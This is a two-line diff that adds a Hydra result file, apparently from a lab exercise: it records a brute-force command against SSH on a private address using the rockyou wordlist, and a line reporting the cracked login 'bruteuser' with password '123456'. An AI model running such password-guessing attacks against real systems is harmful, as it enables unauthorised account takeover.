@@ -1,0 +1,2 @@
+# Hydra v9.4 run at 2025-05-14 03:14:08 on 192.168.1.78 ssh (hydra -l bruteuser -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_result.txt ssh://192.168.1.78)
+[22][ssh] host: 192.168.1.78   login: bruteuser   password: 123456
